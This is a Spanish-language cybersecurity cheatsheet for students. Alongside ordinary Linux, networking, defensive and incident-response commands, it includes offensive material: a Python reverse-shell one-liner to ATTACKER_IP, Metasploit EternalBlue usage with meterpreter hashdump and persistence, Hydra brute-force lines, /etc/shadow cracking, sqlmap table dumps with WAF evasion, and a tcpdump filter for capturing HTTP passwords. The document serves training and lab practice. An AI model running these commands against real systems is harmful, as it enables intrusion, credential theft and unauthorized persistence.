# 🎯 CHEATSHEET: COMANDOS ESENCIALES PARA CIBERSEGURIDAD

## 📚 GUÍA RÁPIDA DE USO

**Convenciones:**
- `<required>` = parámetro obligatorio
- `[optional]` = parámetro opcional
- `|` = o (alternativa)
- `#` = comentario explicativo

---

## 🐧 LINUX - COMANDOS FUNDAMENTALES

### **Navegación y Archivos**

```bash
# NAVEGACIÓN
pwd                              # Mostrar directorio actual
ls -lah                          # Listar TODO (ocultos, permisos, tamaño legible)
cd <directorio>                  # Cambiar directorio
cd ..                            # Subir un nivel
cd ~                             # Ir a home
cd -                             # Volver al directorio anterior

# CREACIÓN Y MANIPULACIÓN
mkdir <directorio>               # Crear carpeta
mkdir -p dir1/dir2/dir3          # Crear estructura completa
touch <archivo>                  # Crear archivo vacío
cp <origen> <destino>            # Copiar archivo
cp -r <origen> <destino>         # Copiar directorio recursivamente
mv <origen> <destino>            # Mover/renombrar
rm <archivo>                     # Eliminar archivo
rm -rf <directorio>              # Eliminar directorio (⚠️ CUIDADO)

# LECTURA DE ARCHIVOS
cat <archivo>                    # Mostrar contenido completo
less <archivo>                   # Ver paginado (q para salir)
head -n 20 <archivo>             # Primeras 20 líneas
tail -n 20 <archivo>             # Últimas 20 líneas
tail -f <archivo>                # Seguir archivo en tiempo real (logs)
wc -l <archivo>                  # Contar líneas

# BÚSQUEDA
find / -name "*.conf" 2>/dev/null           # Buscar archivos .conf
find /home -type f -name "password*"        # Buscar archivos con "password"
find . -type f -mtime -7                    # Archivos modificados últimos 7 días
grep "error" logfile.txt                    # Buscar "error" en archivo
grep -r "password" /etc/                    # Búsqueda recursiva en directorio
grep -i "user" file.txt                     # Case-insensitive
grep -v "DEBUG" log.txt                     # Invertir match (todo EXCEPTO DEBUG)
```

### **Permisos y Usuarios**

```bash
# PERMISOS (rwx = read, write, execute)
chmod 644 file.txt               # rw-r--r-- (dueño rw, grupo r, otros r)
chmod 755 script.sh              # rwxr-xr-x (dueño rwx, otros rx)
chmod +x script.sh               # Hacer ejecutable
chown user:group file.txt        # Cambiar dueño

# USUARIOS Y GRUPOS
whoami                           # Usuario actual
id                               # UID, GID, grupos
sudo -l                          # Listar privilegios sudo
su - otheruser                   # Cambiar a otro usuario
passwd                           # Cambiar contraseña
useradd -m newuser               # Crear usuario con home
userdel -r username              # Eliminar usuario y su home

# PERMISOS ESPECIALES
find / -perm -4000 2>/dev/null   # Buscar archivos con SUID (escalación)
find / -perm -2000 2>/dev/null   # Buscar archivos con SGID
```

### **Procesos y Sistema**

```bash
# PROCESOS
ps aux                           # Todos los procesos
ps aux | grep apache             # Buscar proceso específico
top                              # Monitor en tiempo real
htop                             # Top mejorado (si está instalado)
kill <PID>                       # Terminar proceso
kill -9 <PID>                    # Forzar terminación
killall <nombre_proceso>         # Matar por nombre

# SISTEMA
uname -a                         # Info del sistema
hostname                         # Nombre del host
uptime                           # Tiempo encendido + carga
df -h                            # Espacio en disco (human-readable)
du -sh <directorio>              # Tamaño de directorio
free -h                          # Memoria RAM disponible
lsblk                            # Listar discos y particiones

# SERVICIOS (systemd)
systemctl status <servicio>      # Estado de servicio
systemctl start <servicio>       # Iniciar servicio
systemctl stop <servicio>        # Detener servicio
systemctl restart <servicio>     # Reiniciar servicio
systemctl enable <servicio>      # Habilitar al inicio
systemctl disable <servicio>     # Deshabilitar al inicio
```

---

## 🌐 NETWORKING - COMANDOS BÁSICOS

### **Configuración de Red**

```bash
# INTERFACES (MODERNO - ip)
ip addr show                     # Ver IPs de todas las interfaces
ip a                             # Versión corta
ip link show                     # Estado de interfaces
ip route show                    # Tabla de ruteo
ip route add <red> via <gateway> # Agregar ruta

# INTERFACES (LEGACY - ifconfig)
ifconfig                         # Ver interfaces (deprecated)
ifconfig eth0 up                 # Levantar interfaz
ifconfig eth0 down               # Bajar interfaz
ifconfig eth0 192.168.1.10       # Asignar IP

# DNS
cat /etc/resolv.conf             # Ver DNS configurados
nslookup <dominio>               # Resolver nombre
nslookup <dominio> 8.8.8.8       # Resolver usando DNS específico
dig <dominio>                    # Información detallada DNS
dig +short <dominio>             # Solo la IP
host <dominio>                   # Resolución simple
```

### **Conectividad y Diagnóstico**

```bash
# PING
ping -c 4 <IP|dominio>           # 4 paquetes ICMP
ping -i 0.2 <IP>                 # Intervalo 0.2 segundos
ping -s 1500 <IP>                # Tamaño de paquete 1500 bytes

# TRACEROUTE
traceroute <IP|dominio>          # Ruta de paquetes (Linux)
tracert <IP|dominio>             # Ruta de paquetes (Windows)
mtr <IP|dominio>                 # Traceroute continuo con estadísticas

# CONEXIONES ACTIVAS
netstat -tuln                    # Puertos escuchando (TCP/UDP, numérico)
netstat -tunap                   # + procesos asociados
ss -tuln                         # Versión moderna de netstat
ss -tunap                        # + procesos
lsof -i :80                      # Qué proceso usa puerto 80
lsof -i TCP:1-1024               # Procesos en puertos privilegiados

# ARP
arp -a                           # Tabla ARP (IP ↔ MAC)
ip neigh                         # Tabla ARP (versión moderna)
arp -d <IP>                      # Borrar entrada ARP
```

### **Transferencia de Archivos**

```bash
# SCP (Secure Copy)
scp file.txt user@remote:/path/         # Copiar A servidor remoto
scp user@remote:/path/file.txt .        # Copiar DESDE servidor remoto
scp -r directory/ user@remote:/path/    # Copiar directorio

# WGET
wget <URL>                              # Descargar archivo
wget -O output.txt <URL>                # Guardar con nombre específico
wget -r <URL>                           # Descarga recursiva (sitio completo)

# CURL
curl <URL>                              # Mostrar contenido
curl -O <URL>                           # Descargar archivo
curl -I <URL>                           # Solo headers HTTP
curl -X POST -d "data" <URL>            # POST con data
curl -H "Header: value" <URL>           # Custom header

# NETCAT (Swiss Army Knife)
nc -lvnp 4444                           # Escuchar en puerto 4444
nc <IP> <puerto>                        # Conectar a puerto
nc -lvnp 1234 > received_file           # Recibir archivo
nc <IP> 1234 < file_to_send             # Enviar archivo
```

---

## 🔍 RECONNAISSANCE - COMANDOS DE RECONOCIMIENTO

### **NMAP - El Rey del Scanning**

```bash
# DISCOVERY (HOST DISCOVERY)
nmap -sn 192.168.1.0/24          # Ping sweep (descubrir hosts vivos)
nmap -sn -iL targets.txt         # Desde archivo de IPs

# PORT SCANNING
nmap <IP>                        # Scan top 1000 ports (default)
nmap -p- <IP>                    # Scan TODOS los puertos (1-65535)
nmap -p 80,443,8080 <IP>         # Puertos específicos
nmap -p 1-1024 <IP>              # Rango de puertos

# SERVICE & VERSION DETECTION
nmap -sV <IP>                    # Detectar versiones de servicios
nmap -sV --version-intensity 9 <IP>  # Detección agresiva

# OS DETECTION
sudo nmap -O <IP>                # Detectar sistema operativo

# SCRIPTS NSE
nmap -sC <IP>                    # Scripts default (safe)
nmap --script vuln <IP>          # Scripts de vulnerabilidades
nmap --script=http-enum <IP>     # Enumerar directorios HTTP
nmap --script=smb-vuln* <IP>     # Vulnerabilidades SMB

# TIMING (T0-T5, más rápido = más ruidoso)
nmap -T4 <IP>                    # Timing agresivo
nmap -T0 <IP>                    # Timing paranoid (muy lento, sigiloso)

# EVASIÓN
nmap -f <IP>                     # Fragment packets
nmap -D RND:10 <IP>              # Decoy scan (10 IPs falsas)
nmap -S <spoof_IP> <target>      # Spoofed source IP

# OUTPUT
nmap <IP> -oN output.txt         # Output normal
nmap <IP> -oX output.xml         # Output XML
nmap <IP> -oA basename           # Todos los formatos

# SCAN COMPLETO (AGRESIVO)
sudo nmap -A -T4 -p- <IP> -oN full_scan.txt
# -A: OS detection, version, scripts, traceroute
# -T4: Timing agresivo
# -p-: Todos los puertos
```

### **NMAP - Casos de Uso Específicos**

```bash
# Escanear red corporativa (subredes comunes)
nmap -sn 10.0.0.0/8 192.168.0.0/16 172.16.0.0/12

# Buscar servidores web
nmap -p 80,443,8080,8443 --open 192.168.1.0/24

# Buscar Windows con SMB
nmap -p 445 --open 192.168.1.0/24

# Buscar bases de datos
nmap -p 3306,5432,1433,27017 --open 192.168.1.0/24

# Detectar firewalls
sudo nmap -sA <IP>               # ACK scan (detecta reglas firewall)

# Scan UDP (más lento)
sudo nmap -sU -p 53,161,500 <IP>
```

---

## 📡 WIRESHARK / TCPDUMP - ANÁLISIS DE TRÁFICO

### **TCPDUMP (Command Line)**

```bash
# CAPTURA BÁSICA
sudo tcpdump                     # Capturar en interfaz default
sudo tcpdump -i eth0             # Interfaz específica
sudo tcpdump -i any              # Todas las interfaces
sudo tcpdump -c 100              # Capturar 100 paquetes

# FILTROS BÁSICOS
sudo tcpdump host 192.168.1.10   # Tráfico de/hacia IP específica
sudo tcpdump src 192.168.1.10    # Solo tráfico DESDE IP
sudo tcpdump dst 192.168.1.10    # Solo tráfico HACIA IP
sudo tcpdump net 192.168.1.0/24  # Toda la red

# FILTROS DE PROTOCOLO
sudo tcpdump icmp                # Solo ICMP (ping)
sudo tcpdump tcp                 # Solo TCP
sudo tcpdump udp                 # Solo UDP
sudo tcpdump tcp port 80         # TCP puerto 80 (HTTP)
sudo tcpdump tcp portrange 1-1024  # Rango de puertos

# COMBINACIÓN DE FILTROS (AND, OR, NOT)
sudo tcpdump "tcp port 80 and host 192.168.1.10"
sudo tcpdump "tcp port 443 or tcp port 80"
sudo tcpdump "not port 22"       # Todo EXCEPTO SSH

# OUTPUT
sudo tcpdump -w capture.pcap     # Guardar a archivo
sudo tcpdump -r capture.pcap     # Leer de archivo
sudo tcpdump -A                  # Mostrar contenido ASCII
sudo tcpdump -X                  # Mostrar contenido HEX y ASCII
sudo tcpdump -vv                 # Verbose (más detalles)

# CAPTURA DE PASSWORDS (HTTP)
sudo tcpdump -i eth0 -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
```

### **WIRESHARK - Filtros Display**

```bash
# FILTROS BÁSICOS
ip.addr == 192.168.1.10          # Cualquier tráfico con esta IP
ip.src == 192.168.1.10           # IP origen
ip.dst == 192.168.1.10           # IP destino
tcp.port == 80                   # Puerto TCP 80
udp.port == 53                   # Puerto UDP 53

# PROTOCOLOS
http                             # Solo HTTP
https || tls                     # HTTPS/TLS
dns                              # DNS
icmp                             # ICMP (ping)
arp                              # ARP

# HTTP ESPECÍFICO
http.request                     # Solo requests HTTP
http.request.method == "POST"    # Solo POST requests
http.request.uri contains "login"  # URIs con "login"
http.response.code == 404        # Respuestas 404
http.cookie contains "session"   # Cookies con "session"

# TCP FLAGS
tcp.flags.syn == 1               # SYN packets
tcp.flags.ack == 1               # ACK packets
tcp.flags.reset == 1             # RST packets
tcp.analysis.retransmission      # Retransmisiones (posible problema)

# COMBINACIONES (&&, ||, !)
ip.addr == 192.168.1.10 && tcp.port == 80
http || dns
!(arp || icmp)                   # Todo excepto ARP e ICMP

# BUSCAR STRINGS
frame contains "password"        # Buscar texto en paquetes
tcp contains "admin"             # Buscar en payloads TCP
```

### **TSHARK (Wireshark CLI)**

```bash
# CAPTURA Y ANÁLISIS
tshark -i eth0                   # Capturar interfaz
tshark -r capture.pcap           # Leer archivo
tshark -i eth0 -w output.pcap    # Capturar a archivo

# FILTROS
tshark -i eth0 -f "tcp port 80"  # Capture filter
tshark -r file.pcap -Y "http"    # Display filter

# ESTADÍSTICAS
tshark -r file.pcap -q -z io,phs  # Protocol Hierarchy Statistics
tshark -r file.pcap -q -z conv,ip  # Conversaciones IP
tshark -r file.pcap -q -z endpoints,ip  # Endpoints

# EXTRAER CAMPOS
tshark -r file.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport
```

---

## 🔓 EXPLOITATION - HERRAMIENTAS DE EXPLOTACIÓN

### **METASPLOIT FRAMEWORK**

```bash
# INICIAR METASPLOIT
msfconsole                       # Consola interactiva
msfconsole -q                    # Quiet mode (sin banner)

# BÚSQUEDA DE EXPLOITS
search <keyword>                 # Buscar exploit/módulo
search type:exploit platform:windows  # Búsqueda filtrada
search cve:2017                  # Buscar por CVE

# USAR EXPLOIT
use exploit/windows/smb/ms17_010_eternalblue
show options                     # Ver opciones requeridas
set RHOSTS 192.168.1.10          # IP target
set LHOST 192.168.1.100          # Tu IP
set PAYLOAD windows/meterpreter/reverse_tcp
exploit                          # Lanzar exploit
run                              # Alias de exploit

# METERPRETER (POST-EXPLOTACIÓN)
sysinfo                          # Info del sistema
getuid                           # Usuario actual
ps                               # Listar procesos
migrate <PID>                    # Migrar a otro proceso
hashdump                         # Dump de hashes (si admin)
shell                            # Shell del sistema
upload <local> <remote>          # Subir archivo
download <remote> <local>        # Descargar archivo
screenshot                       # Captura de pantalla

# PERSISTENCIA
run persistence -X -i 60 -p 4444 -r <your_IP>

# PIVOTING
route add 10.10.10.0 255.255.255.0 <session_id>  # Agregar ruta
```

### **HYDRA - Brute Force**

```bash
# SSH
hydra -l <usuario> -P <wordlist> ssh://<IP>
hydra -L users.txt -P pass.txt ssh://192.168.1.10

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10

# HTTP POST
hydra -l admin -P pass.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:Failed"

# RDP
hydra -l administrator -P pass.txt rdp://192.168.1.10

# OPCIONES
-t 4                             # 4 threads (default 16)
-V                               # Verbose (mostrar intentos)
-f                               # Parar al encontrar credenciales
```

### **JOHN THE RIPPER - Password Cracking**

```bash
# CRACKEAR HASH
john <hashfile>                  # Auto-detectar formato
john --format=raw-md5 <hashfile>  # Formato específico
john --wordlist=rockyou.txt <hashfile>  # Con wordlist

# VER RESULTADOS
john --show <hashfile>

# FORMATOS COMUNES
john --format=raw-sha256 hash.txt
john --format=nt hash.txt        # NTLM hash (Windows)

# CRACKEAR /etc/shadow (Linux)
sudo unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt

# ZIP PROTEGIDO
zip2john file.zip > hash.txt
john hash.txt
```

### **SQLMAP - SQL Injection**

```bash
# BÁSICO
sqlmap -u "http://example.com/page?id=1"  # URL vulnerable
sqlmap -u "http://example.com/page?id=1" --dbs  # Listar databases
sqlmap -u "http://example.com/page?id=1" -D <db> --tables  # Tablas
sqlmap -u "http://example.com/page?id=1" -D <db> -T users --dump  # Dump tabla

# POST REQUEST
sqlmap -u "http://example.com/login" --data="user=admin&pass=admin"

# CON COOKIE
sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=abc123"

# DESDE BURP REQUEST
sqlmap -r request.txt            # Archivo de request HTTP

# OPCIONES ÚTILES
--batch                          # Nunca pedir input (auto)
--level=5                        # Agresividad (1-5)
--risk=3                         # Riesgo (1-3, más alto = más peligroso)
--random-agent                   # User-agent aleatorio
--tamper=space2comment           # Evasión WAF
```

---

## 🛡️ DEFENSIVE - COMANDOS DE DEFENSA

### **ANÁLISIS DE LOGS**

```bash
# LOGS DE SISTEMA (Linux)
tail -f /var/log/syslog          # Seguir syslog en tiempo real
tail -f /var/log/auth.log        # Autenticaciones
grep "Failed password" /var/log/auth.log  # Intentos fallidos de login
grep "Accepted" /var/log/auth.log  # Logins exitosos

# LOGS DE APACHE
tail -f /var/log/apache2/access.log
tail -f /var/log/apache2/error.log
cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -rn  # IPs más frecuentes

# LOGS DE SSH
lastlog                          # Últimos logins
last                             # Historial de logins
who                              # Usuarios conectados ahora
w                                # Usuarios + qué están haciendo

# BUSCAR PATRONES SOSPECHOSOS
grep -i "failed" /var/log/auth.log | wc -l  # Contar intentos fallidos
awk '/Failed password/ {print $11}' /var/log/auth.log | sort | uniq -c | sort -rn  # IPs con más fallos
```

### **DETECCIÓN DE INTRUSIONES**

```bash
# CONEXIONES SOSPECHOSAS
netstat -tunap | grep ESTABLISHED  # Conexiones establecidas
lsof -i -P -n                    # Puertos y procesos (sin resolución DNS)
ss -tunap 'state established'    # Conexiones activas

# PROCESOS SOSPECHOSOS
ps aux --sort=-%cpu | head       # Top procesos por CPU
ps aux --sort=-%mem | head       # Top procesos por memoria
ps -eo pid,user,cmd,%mem,%cpu --sort=-%cpu | head  # Formato custom

# ARCHIVOS MODIFICADOS RECIENTEMENTE
find /etc -type f -mtime -1      # Modificados en últimas 24h
find / -type f -name "*.php" -mtime -7  # PHPs modificados última semana

# BINARIOS CON SUID (RIESGO DE ESCALACIÓN)
find / -perm -4000 -type f 2>/dev/null

# CRON JOBS (PERSISTENCIA)
crontab -l                       # Crons del usuario actual
sudo cat /etc/crontab            # Crons del sistema
ls /etc/cron.*                   # Directorio de crons
```

### **FIREWALL (iptables)**

```bash
# VER REGLAS
sudo iptables -L -n -v           # Listar reglas (numérico, verbose)
sudo iptables -L INPUT -n -v     # Solo cadena INPUT

# BLOQUEAR IP
sudo iptables -A INPUT -s 192.168.1.100 -j DROP

# PERMITIR PUERTO
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # SSH
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # HTTP

# POLÍTICA DEFAULT
sudo iptables -P INPUT DROP      # Denegar todo por defecto
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# GUARDAR REGLAS
sudo iptables-save > /etc/iptables/rules.v4  # Debian/Ubuntu
sudo service iptables save       # CentOS/RHEL

# LIMPIAR REGLAS
sudo iptables -F                 # Flush todas las reglas
sudo iptables -X                 # Eliminar cadenas custom
```

---

## 🔐 CRYPTOGRAPHY - COMANDOS DE CIFRADO

```bash
# HASH FILES
md5sum file.txt                  # MD5 (débil, no usar)
sha256sum file.txt               # SHA-256
sha512sum file.txt               # SHA-512

# CIFRAR/DESCIFRAR CON OPENSSL
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc  # Cifrar
openssl enc -aes-256-cbc -d -in file.enc -out file.txt     # Descifrar

# GENERAR KEYS
openssl genrsa -out private.key 2048  # Generar private key RSA
openssl rsa -in private.key -pubout -out public.key  # Extraer public key

# CERTIFICADOS SSL/TLS
openssl s_client -connect google.com:443  # Inspeccionar certificado
openssl x509 -in cert.pem -text -noout    # Leer certificado

# PASSWORD HASHING (para almacenar)
echo -n "password" | openssl passwd -1 -stdin  # MD5 (Linux /etc/shadow)
echo -n "password" | openssl passwd -6 -stdin  # SHA-512
```

---

## 🐍 SCRIPTING - SNIPPETS ÚTILES

### **BASH ONE-LINERS**

```bash
# PING SWEEP
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes" & done

# PORT SCAN SIMPLE
for port in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/192.168.1.10/$port" 2>/dev/null && echo "Port $port open"; done

# EXTRAER IPS DE LOGS
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" access.log | sort -u

# MONITOREO CONTINUO DE ARCHIVO
watch -n 1 'tail -n 20 /var/log/syslog'

# BACKUP RÁPIDO
tar -czf backup-$(date +%Y%m%d).tar.gz /path/to/dir
```

### **PYTHON ESSENTIALS**

```python
# HTTP SERVER RÁPIDO
python3 -m http.server 8000      # Servir directorio actual

# REVERSE SHELL (pentesting)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# ENCODE/DECODE BASE64
echo "text" | base64              # Encode
echo "dGV4dAo=" | base64 -d       # Decode
```

---

## 📋 WINDOWS - COMANDOS ESENCIALES

### **PowerShell**

```powershell
# NETWORKING
Get-NetIPAddress                 # Ver IPs
Get-NetRoute                     # Tabla de ruteo
Test-NetConnection <IP> -Port 80  # Test conectividad (como telnet)
Resolve-DnsName <dominio>        # Resolver DNS

# PROCESOS Y SERVICIOS
Get-Process                      # Listar procesos
Stop-Process -Name <proceso>     # Matar proceso
Get-Service                      # Listar servicios
Restart-Service <servicio>       # Reiniciar servicio

# ARCHIVOS
Get-ChildItem -Recurse -Filter *.txt  # Buscar archivos .txt
Get-Content file.txt             # Leer archivo (como cat)
Select-String "password" *.txt   # Buscar texto (como grep)

# USUARIOS
Get-LocalUser                    # Usuarios locales
Get-LocalGroup                   # Grupos locales
Get-LocalGroupMember Administrators  # Miembros de Administrators
```

### **CMD (Command Prompt)**

```cmd
# NETWORKING
ipconfig /all                    # Configuración IP completa
ipconfig /displaydns             # Caché DNS
ipconfig /flushdns               # Limpiar caché DNS
netstat -ano                     # Conexiones + PID
route print                      # Tabla de ruteo

# PROCESOS
tasklist                         # Listar procesos
taskkill /PID <PID> /F           # Matar proceso por PID
taskkill /IM <nombre.exe> /F     # Matar por nombre

# ARCHIVOS
dir /s /b *.txt                  # Buscar archivos .txt recursivamente
type file.txt                    # Leer archivo (como cat)
findstr "password" *.txt         # Buscar texto (como grep)

# USUARIOS
net user                         # Listar usuarios
net localgroup administrators    # Miembros de administrators
net user <usuario> <password> /add  # Crear usuario
```

---

## 🚨 INCIDENT RESPONSE - RESPUESTA A INCIDENTES

```bash
# CAPTURA RÁPIDA DE INFORMACIÓN (LINUX)
date; hostname; uname -a > incident_$(date +%Y%m%d_%H%M%S).txt
ps aux >> incident.txt
netstat -tunap >> incident.txt
last >> incident.txt
cat /var/log/auth.log >> incident.txt

# CAPTURA MEMORIA (SI TIENES LiME)
sudo insmod lime.ko "path=/tmp/memory.lime format=lime"

# CAPTURA DISCO (FORENSE)
sudo dd if=/dev/sda of=/mnt/backup/disk.img bs=4M status=progress

# PRESERVAR LOGS
sudo tar -czf logs_$(date +%Y%m%d).tar.gz /var/log/

# AISLAR HOST (CORTAR RED)
sudo ip link set eth0 down
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
```

---

## 💡 TIPS FINALES

### **Aliases Útiles (agregar a ~/.bashrc)**

```bash
# Agregar al final de ~/.bashrc
alias ll='ls -lah'
alias ..='cd ..'
alias update='sudo apt update && sudo apt upgrade -y'
alias ports='netstat -tuln'
alias myip='ip addr show | grep inet'
alias scan='nmap -sV -sC'
alias http='python3 -m http.server'

# Recargar aliases
source ~/.bashrc
```

### **Historial de Comandos**

```bash
history                          # Ver historial completo
history | grep nmap              # Buscar comando en historial
!<número>                        # Ejecutar comando por número
!!                               # Repetir último comando
!$                               # Último argumento del comando anterior

# Guardar historial importante
history | grep "nmap -sV" > my_scans.txt
```

### **Man Pages (RTFM - Read The F*ing Manual)**

```bash
man <comando>                    # Manual completo del comando
man -k <keyword>                 # Buscar comandos relacionados
<comando> --help                 # Ayuda rápida
tldr <comando>                   # Ejemplos prácticos (si instalado)
```

---

## 📖 CÓMO USAR ESTE CHEATSHEET

### **Método de Estudio:**

1. **NO memorices todo** → Entiende los conceptos
2. **Practica cada comando** → Úsalo 3-5 veces
3. **Crea tu propio cheatsheet** → Con comandos que MÁS usas
4. **Imprime secciones clave** → Ten a mano durante labs
5. **Revisa antes de entrevistas** → Refuerzo rápido

### **Progresión Recomendada:**

**Semana 1-2:** Linux + Networking Básico  
**Semana 3-4:** Nmap + Wireshark  
**Semana 5-6:** Metasploit + Exploitation  
**Semana 7-8:** Defensive + Incident Response  

### **¿Cuándo Dominas un Comando?**

✅ Lo usas sin consultar el cheatsheet  
✅ Puedes explicarlo a alguien  
✅ Sabes cuándo es apropiado usarlo  
✅ Entiendes su output e implicaciones

---

## 🎯 COMANDOS QUE TODO PROFESIONAL DEBE DOMINAR

### **Junior Level (3 meses):**
- `ls`, `cd`, `cat`, `grep`, `find`
- `ping`, `nmap`, `netstat`
- `tcpdump` (básico)
- `chmod`, `chown`

### **Mid Level (6-12 meses):**
- `nmap` (avanzado con NSE)
- `wireshark` / `tshark`
- `msfconsole`
- `iptables`
- Scripting bash básico

### **Senior Level (2+ años):**
- Automatización completa (Python/Bash)
- Análisis forense
- Evasión de detección
- Desarrollo de exploits custom
- Arquitectura de seguridad

---

**Guarda este cheatsheet en:**
- 📱 Móvil (captura de pantalla o PDF)
- 💻 Laptop (archivo .md o .txt)
- ☁️ GitHub (tu repositorio personal)
- 🖨️ Impreso (para laboratorios sin Internet)

**Recuerda:** La diferencia entre un principiante y un profesional no es cuántos comandos conoces, sino qué tan bien entiendes CUÁNDO y POR QUÉ usar cada uno.

🚀 **¡Practica estos comandos en tu laboratorio y documenta tus hallazgos!**